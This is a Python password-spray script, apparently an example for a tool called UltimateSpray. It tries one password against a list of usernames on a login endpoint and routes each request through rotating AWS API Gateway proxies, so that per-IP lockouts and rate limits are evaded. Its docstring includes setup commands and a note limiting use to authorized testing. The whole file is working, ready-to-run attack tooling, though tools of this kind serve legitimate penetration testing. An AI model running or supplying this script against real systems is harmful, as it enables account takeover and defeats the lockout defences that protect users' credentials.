#!/usr/bin/env python3
"""Password-spray example using UltimateSpray's RotatingProxy helper.

Each request exits AWS API Gateway from a fresh source IP, so a slow, spread-out
spray avoids per-IP lockouts and rate limits.

    1. Create one or more proxies pointing at the auth endpoint:
         ultimatespray create https://target.example.com --regions us-east-1,eu-west-1
    2. Feed the printed proxy URLs to this script:
         python spray_example.py \\
           --proxy https://<id1>.execute-api.us-east-1.amazonaws.com/ultimatespray/ \\
           --proxy https://<id2>.execute-api.eu-west-1.amazonaws.com/ultimatespray/ \\
           --users users.txt --password 'Winter2026!'

ONLY run this against systems you are explicitly authorized to test.
"""

import argparse
import sys
import time

from ultimatespray.spray import RotatingProxy


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Authorized password spray via UltimateSpray")
    p.add_argument("--proxy", action="append", required=True,
                   help="Proxy URL (repeat for a rotation pool)")
    p.add_argument("--users", required=True, help="File with one username per line")
    p.add_argument("--password", required=True, help="Single password to spray")
    p.add_argument("--path", default="/login", help="Auth path on the target")
    p.add_argument("--delay", type=float, default=2.0, help="Seconds between requests")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    with open(args.users) as fh:
        users = [u.strip() for u in fh if u.strip()]

    proxy = RotatingProxy(args.proxy)
    for user in users:
        try:
            resp = proxy.post(
                args.path,
                data={"username": user, "password": args.password},
                allow_redirects=False,
                timeout=20,
            )
            print(f"[{resp.status_code}] {user} (authentication outcome unverified)")
        except Exception as exc:  # noqa: BLE001
            print(f"[ERR] {user}: {exc}")
        time.sleep(args.delay)

    print("\nDone. Review server-side authentication evidence before classifying results.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
